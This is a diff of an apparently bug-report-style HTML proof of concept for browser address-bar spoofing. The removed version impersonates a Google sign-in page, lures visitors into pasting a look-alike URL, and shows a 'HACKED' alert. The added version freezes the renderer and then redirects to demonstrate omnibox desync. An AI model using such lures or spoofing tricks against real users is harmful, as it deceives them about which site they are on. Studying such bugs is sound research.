@@ -1,44 +1,18 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Google Sign-in</title>
-  <style>
-    body, html { margin: 0; padding: 0; height: 100%; background: #fff; }
-    .box {
-      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      text-align: center; font-family: Arial, sans-serif;
-    }
-    h1 { font-size: 28px; color: #202124; }
-    p  { font-size: 16px; color: #5f6368; }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <h1>Session verification required</h1>
-    <p>Copy the address below, paste it in the address bar, and press Enter to verify your Google session.</p>
-    <p style="font-weight:bold;user-select:all">https://google-login.accounts.google.com</p>
-  </div>
-
+<html>
+<head><meta charset="utf-8"><title>tester</title></head>
+<body style="display:flex;align-items:center;justify-content:center;min-height:100vh">
+  <button id="go" style="padding:16px 32px;font-size:18px">GO</button>
   <script>
-    // Saat halaman itu di-enter / tab kembali aktif, tunjukkan "compromise"
-    document.addEventListener("visibilitychange", function () {
-      if (document.visibilityState === "visible") {
-        setTimeout(function () {
-          alert("HACKED BY FARISSAL B");
-        }, 300);
-      }
-    });
+    document.getElementById("go").onclick = function () {
+      // 1) freeze renderer sejenak (efek "hang parah")
+      const s = performance.now();
+      while (performance.now() - s < 3000) Math.sqrt(performance.now());
 
-    // Fallback: kalau korban navigate balik (history/back), alert juga
-    window.addEventListener("pageshow", function (e) {
-      if (e.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
-        setTimeout(function () {
-          alert("HACKED BY FARISSAL B");
-        }, 300);
-      }
-    });
+      // 2) redirect ke target — omnibox pindah, demonstrasikan
+      //    stale-paint / omnibox desync di sini
+      location.href = "https://www.google.com";
+    };
   </script>
 </body>
 </html>
